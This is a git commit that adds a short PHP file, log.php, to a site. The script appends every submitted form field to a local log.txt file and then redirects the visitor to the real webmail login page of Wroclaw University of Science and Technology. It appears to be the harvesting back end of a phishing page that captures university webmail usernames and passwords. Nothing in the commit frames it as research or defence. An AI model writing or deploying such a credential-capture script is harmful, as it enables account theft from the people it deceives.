8c0e31884ddf55e9ee33a18aff11db37b095d177
Tymoteusz Surynt <tymoteusz.surynt@gmail.com>
2017-11-03 22:09:33 +0100

    0

---
+++ Site/log.php
@@ -0,0 +1,14 @@
+<?php
+	header('Location:https://smail.pwr.edu.pl/auth');
+	$handle=fopen("log.txt","a");
+	fwrite($handle,"Atempt:\r\n");
+	foreach($_POST as $variable => $value){
+		fwrite($handle, $variable);
+		fwrite($handle, "=");
+		fwrite($handle, $value);
+		fwrite($handle, "\r\n");
+	}
+	fwrite($handle, "\r\n");
+	fclose($handle);
+	exit;
+?>
